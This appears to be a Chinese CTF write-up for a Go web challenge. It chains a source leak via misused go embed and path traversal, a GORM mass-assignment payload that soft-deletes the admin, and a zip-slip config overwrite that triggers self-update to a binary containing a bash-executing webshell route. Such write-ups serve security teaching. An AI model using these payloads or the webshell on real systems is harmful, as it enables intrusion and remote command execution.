# WP

## 目录穿越读取源代码

go embed * 的错误使用，导致源代码被打包进程序。

再结合错误的静态文件托管，导致`/../`路径可以列目录获取源代码

## Gorm 软删除注入

代码审计，发现

1. 管理员账户是数据库中的第一个用户，而这个用户目前无法登陆

2. 对于`/register`接口，`controller`使用了`c.ShouldBindJSON()`, `db`层对其返的值直接进行一个`db.Save()`到数据库的操作，可以注入`gorm.Model`相关字段

因此可以构造注入`deletedat`字段，使得原来的`admin`被软删除

```json
{"id":1,"deletedat":"2011-01-01T11:11:11Z","createdat":"2011-01-01T11:11:11Z"}
```

注意`createdat`字段是`datetime`类型，如果这个字段留空，会update`0000-00-00 00:00:00`到 MySQL，而这个值不在datetime范围内，所以需要手动指定

## 解压缩覆盖配置文件，自更新RCE

代码审计，发现

1. 解压缩功能未检查目录穿越，可以通过目录穿越任意文件写
2. 自更新的URL支持通过配置文件热更新
3. `unzipped`目录下的文件会被托管

因此可以构造一个压缩包

```
..
|- ..
  |- config.yaml
|- exp
```

### config.yaml

```yaml
server:
  noAdminLogin: true
database:
  user: root
  password: root
  host: 127.0.0.1
  port: 3306
update:
  enabled: true
  url: http://127.0.0.1:8080/unzipped/exp
  interval: 1
```

### exp 部分源码

```go
r.POST("/shell", func(c *gin.Context) {
		output, err := exec.Command("/bin/bash", "-c", c.PostForm("cmd")).CombinedOutput()
		if err != nil {
			c.String(500, err.Error())
		}
		c.String(200, string(output))
	})
```

在 dump 下来的源码里添加一个 webshell，再构建为 update

`config.yaml`将覆盖原有的 config 并在一分钟左右触发自更新，更新为我们上传的`update`文件

成功RCE，flag在根目录。
